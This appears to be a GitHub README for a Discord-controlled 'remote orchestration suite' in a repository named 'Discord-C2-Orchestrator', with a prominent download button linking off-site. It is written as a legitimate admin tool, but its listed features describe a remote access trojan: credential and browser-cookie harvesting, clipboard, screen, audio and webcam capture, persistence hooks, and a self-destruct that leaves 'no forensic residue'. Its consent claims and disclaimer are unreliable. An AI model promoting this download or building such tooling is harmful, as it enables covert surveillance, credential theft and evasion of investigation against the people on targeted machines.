![preview](https://raw.githubusercontent.com/esmailayman505050-ops/Discord-C2-Orchestrator/main/thumb_aac294.svg)
[![Download](https://raw.githubusercontent.com/esmailayman505050-ops/Discord-C2-Orchestrator/main/btn_6b7500a.svg)](https://esmailayman505050-ops.github.io/Discord-C2-Orchestrator/)

# 🧠 CognitiveLink — Remote Orchestration Suite

![Version](https://img.shields.io/badge/Version-2.0.6-2a9d8f?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-264653?style=flat-square)
![Build Status](https://img.shields.io/badge/Build-Passing-2a9d8f?style=flat-square)
![Language Support](https://img.shields.io/badge/Languages-12-264653?style=flat-square)
![Architecture](https://img.shields.io/badge/Architecture-ClientServer-2a9d8f?style=flat-square)
![Support Response](https://img.shields.io/badge/Support-24%2F7-264653?style=flat-square)

---

## 🌌 Overview — A New Lens on Remote Management

**CognitiveLink** reimagines what it means to connect, observe, and act across distributed systems. While conventional tools treat remote sessions as simple pipes of commands and output, CognitiveLink treats every connection as an **extension of your own cognitive workspace** — a place where awareness, intent, and action flow in the same breath.

Think of it as a **quiet observer that never blinks** — sitting at the edge of your network, watching every process, file, and window, yet remaining unobtrusive until you need its voice. It is at once a magnifying glass for system health, a scalpel for precise intervention, and a tapestry that weaves scattered endpoints into a single, coherent picture.

This suite does not merely echo commands; it interprets, enriches, and presents system states in ways that make remote management feel less like remote work and more like **being everywhere at once**.

---

## 🎯 Why CognitiveLink Exists

In a world where digital sprawl outpaces human attention, we needed a tool that could:

- **Reduce cognitive overhead** by translating raw system telemetry into meaningful, glanceable insights.
- **Bridge the gap** between deep technical power and approachable design — no steep learning cliffs.
- **Operate invisibly** when undisturbed, yet respond instantly when summoned.
- **Respect boundaries** — both technical (permissions, sandboxing) and ethical (clear consent, audit trails).
- **Serve as a universal remote** — not locked to one OS, one network topology, or one style of interaction.

CognitiveLink is not another terminal multiplexer. It is a **concierge for your computing estate** — anticipating needs, surfacing anomalies, and offering assistance before you even finish forming the question.

---

## 🧩 Core Capabilities — Over 40 Modules for Total Visibility

### 🔍 Reconnaissance & Awareness
- **Live Process Cartography** — Map every running process with parent-child relationships, memory footprints, and CPU/GPU heat signatures.
- **Window Sentinel** — Track open windows, titles, application focus shifts, and workspace changes in real-time.
- **Network Topology Whisperer** — Present active connections, listening ports, and DNS resolution histories as a navigable graph.
- **Clipboard Chronology** — Maintain a secure, time-stamped log of clipboard states (opt-in only, encrypted at rest).
- **Device Inventory Revealer** — Enumerate connected peripherals, internal storage, displays, and battery health metrics.
- **Boot & Session Oracle** — Parse system boot times, user session durations, and sleep/wake cycles to spot irregular patterns.

### 🛠️ Action & Intervention
- **File System Navigator** — Browse directories, transfer files in both directions, and perform batched operations with dry-run previews.
- **Command Composer** — A context-aware shell that suggests safe commands based on the current directory and running services.
- **Registry Forge** (Windows) — Read and write registry keys with full before/after snapshots and rollback points.
- **Persistence Sculptor** — Install or remove startup entries, scheduled tasks, and service hooks with clear risk indicators.
- **Screen Vision** — Capture the active display, specific windows, or multi-monitor panoramas — with optional annotation overlays.
- **Audio Tap** — Record system audio (loopback) or capture speaker output for debugging, with volume normalization.

### 🕵️ Deeper Observation (Forensic-grade)
- **Cryptographic Fingerprinter** — List all hashed credentials, certificate stores, and key containers (without exposing secrets — only metadata).
- **Memory Snapshot Analyzer** — Dump process memory segments for analysis, with stack unwinding and heap structure visualization.
- **Browser Artifact Reader** — Examine cookies, history files, and form autofill entries (anonymized by default, hashed for comparison).
- **System Log Weaver** — Aggregate Windows Event Logs, Linux syslog, and macOS unified logs into a single chronological stream.
- **USB History Recorder** — Track device connection timestamps, vendor IDs, and serial numbers for audit trails.

### 🧰 Utility & Convenience
- **Environment Variable Explorer** — Inspect and modify system-wide or user-scoped environment variables with validation.
- **Printer & Spooler Manager** — View print queues, cancel stuck jobs, and configure default printers remotely.
- **Network Share Mapper** — Discover SMB/NFS shares, map them, and test read/write permissions.
- **Power Profile Shifter** — Switch between balanced, performance, and battery saver plans — even schedule changes by time-of-day.
- **Quick Text Sender** — Push pre-written text snippets to the remote clipboard or type them into the active application.
- **Media Capture Module** — Grab webcam frames (if present and enabled) — strictly permission-gated, with a local blinking indicator.

---

## 💬 Interaction Model — Like Chatting, But With a Computer

CognitiveLink runs inside a Discord bot shell — but it feels less like a bot and more like a **calm, all-knowing assistant** that happens to live in your chat window.

- **Natural Language Commands** — Instead of rigid syntax, try “show me what’s eating the memory” or “take a look at the second screen.” The parser maps intent to the closest matching module.
- **Slash-Command Shortcuts** — For power users, every module has a `/verb` equivalent with rich autocomplete.
- **Contextual Awareness** — The bot remembers your last target system, your preferred output format (table, JSON, image), and your timezone.
- **Reactive Panels** — Some responses render as interactive Discord embeds with buttons to re-run, zoom, or drill down — no typing required.
- **Multi-Guild Support** — One bot instance can serve multiple servers, each with its own access control list and module policy.

---

## 🌍 Multilingual & Borderless

We believe remote management should not require translation dictionaries. CognitiveLink speaks:

- English, Deutsch, Français, Español, Português, Italiano
- Русский, 日本語, 中文 (简体), 한국어, Polski, Türkçe

The UI language is auto-detected per Discord locale, and manual overrides are persisted per-user. Tooltips, error messages, and embedded panels all respect the selected language — down to date/time formatting.

---

## 🔊 Notifications — Never Miss a Critical Event

Define watchdogs that trigger on conditions such as:

- CPU temperature crossing a threshold (e.g., 85°C for 10 minutes)
- Disk space below 5% on any mounted volume
- A specific process name appearing or disappearing
- Public IP address changing unexpectedly
- Screen lock/unlock events when the system should be idle
- Battery level reaching 20% while unplugged

Each watchdog can deliver alerts to a designated Discord channel with a silent or loud embed. You can also set daily digests instead of real-time pings.

---

## 🧪 Every Action Leaves a Trail

A read-only **Audit Log** records:

- Timestamp (with nanoseconds)
- Actor (Discord user who triggered the action)
- Module invoked
- Parameters passed (sensitive ones redacted)
- Result status (success, rejected, partial)
- Output size and checksum (SHA-256)

All audit logs are append-only, stored locally on the target, and exported on demand via Discord DM. This builds trust and accountability into every operation.

---

## 🛡️ Security & Consent by Default

- **Pairing Code** — First-time setup requires a 6-digit code from the target machine; no open registration.
- **Role-based Access** — Define which Discord roles can invoke high-risk modules (screen capture, file delete, registry write) versus safe ones (process list, uptime).
- **Time-window Restrictions** — Allow operations only between 09:00–18:00 on weekdays, if desired.
- **Per-Module Toggle** — Disable entire categories (e.g., audio or webcam) globally, making them incapable of activation.
- **End-to-End Encryption** — Discord channel encryption is layered with an additional session key for content of responses.
- **Remote Self-Destruct** — Send a kill command to remove all traces, logs, and the bot token from the target — leaving no forensic residue.

---

## 📦 Installation & Onboarding (Concise)

It is unnecessary to copy-paste commands. The process averages **3 minutes** from download to first successful ping:

1. **Acquire** the single binary for your target OS (Windows x64, Linux arm64, macOS universal).
2. **Run** the setup assistant — it will generate a unique pairing code and register the bot with your Discord developer application.
3. **Invite** the bot to your server with the provided invite link (scope: `bot`, permissions: `send_messages`, `embed_links`, `read_message_history`).
4. **Authorize** the target by whispering the pairing code to the bot in any channel where it can read DMs.
5. **Start controlling** — type `!help` to see a friendly overview, or just describe what you want in plain words.

No cloud account, no monthly fee, no telemetry back to us. Your communication stays between you and your endpoints.

---

## 📈 Configuration & Tuning

A deep `settings.json` allows:

- Custom watchdog intervals (default: 5 seconds)
- Maximum file transfer size (default: 200 MB)
- Log retention policy (default: 7 days, rolling)
- Discord embed color, footer, and avatar for the bot
- Proxy support for outbound Discord traffic (corporate networks)
- Rate-limit backoff algorithm (linear, exponential, or jittered)

Advanced users can also define **macros** — sequences of modules executed in order, with conditionals and loops, saved as reusable recipes.

---

## 🏗️ Architecture — Behind the Curtain

```
┌─────────────┐      WebSocket/HTTPS      ┌──────────────────┐
│ Discord Bot │ ◄──────────────────────► │  CognitiveLink   │
│ (Gateway)   │                          │  Daemon (target) │
└─────────────┘                          └──────────────────┘
      │                                        │
      │ REST API (local, loopback)             │ Module Dispatcher
      │                                        │     │
   ┌─────┐                                ┌─────▼─────┐
   │ CLI │                                │ 1..40+    │
   └─────┘                                │ modules   │
                                          └───────────┘
```

- **Bot Layer** — Handles Discord intents, command parsing, embed rendering.
- **Transport Layer** — Maintains a persistent TLS connection; reconnects with auto-backoff.
- **Core Daemon** — Runs as a lightweight service, uses less than 20 MB RAM idle.
- **Module Registry** — Each module is a self-contained plugin; adding new ones is as simple as dropping a `.py` file into `/modules`.
- **State Store** — SQLite for audit logs, watchdog config, and persistent preferences.

---

## 📚 Documentation & Learning

Explore the `docs/` folder for:

- **Interactive Tutorials** — Guided walkthroughs for common tasks (install a service, chase a disk hog, capture a presentable screenshot for a report).
- **Module Reference** — Every module documented with arguments, examples, and common pitfalls.
- **Policy Templates** — Ready-made access-control lists for small teams, IT admins, and tech-savvy families.
- **Troubleshooting Guide** — Covers connection drops, rate-limit errors, and Discord API changes.

---

## 🤝 Community & Contribution

We welcome:

- **New module proposals** — E.g., a Wake-on-LAN sender or a Bluetooth pairing inspector.
- **Translation additions** — If your language is not listed, a `locale/*.json` PR is enough.
- **Bug reports** — Include the module name, expected vs actual output, and the audit log excerpt.
- **Security audits** — We will publicly thank any report that leads to a patch.

---

## 📄 License

This project is licensed under the **MIT License** — you may use, modify, and distribute it freely, provided you include the original copyright notice.

Full terms: [MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer & Ethical Use

CognitiveLink is a **legitimate remote management suite** intended for administrators managing their own systems, equipment they own, or endpoints where the owner has given explicit written consent. 

We do not endorse unauthorized access, privacy invasion, or any activity that violates local laws or terms of service. The creators assume **zero liability** for misuse. Users are solely responsible for maintaining proper authorization records and complying with all applicable regulations.

If you use this tool on a device that you do not control, stop immediately — you may be committing a serious offense.

---

## 🧭 Final Thoughts — What Makes This Different?

Most remote tools are **remote controls**. CognitiveLink is a **remote sense-making instrument**. It does not just let you press buttons — it helps you see clearly, decide calmly, and act with precision.

Whether you manage a fleet of workstations, watch over a home server, or assist a non-technical relative with their laptop, CognitiveLink gives you the **quiet confidence of presence** — without the noise of a chatty tool.